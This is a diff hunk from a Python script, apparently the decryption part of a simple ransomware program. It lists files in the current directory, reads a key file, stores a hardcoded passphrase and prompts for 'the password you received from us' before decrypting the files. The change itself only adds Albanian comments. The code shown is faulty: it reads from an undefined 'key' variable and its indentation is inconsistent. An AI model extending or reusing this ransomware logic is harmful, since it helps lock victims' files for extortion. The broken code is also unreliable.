@@ -12,10 +12,10 @@ for file in os.listdir():
 
 print(allfiles)
 
-with open("key.key", "rb") as thekey:
+with open("key.key", "rb") as thekey: #krijimi i password'it si celes
 	password = key.read()
-passphrase = "R0mo3!1x"
-userpass = input("Enter the password you received from us: ")
+passphrase = "R0mo3!1x" #password'i
+userpass = input("Enter the password you received from us: ") #kushti per t'u kycur, nese vlera e dhene nga perdoruesi, perputhet me password'in- deenkriptohen fajllat
         if userpass == passphrase:
  	            for file in allfiles:
 	            with open(file, "rb") as thefile:
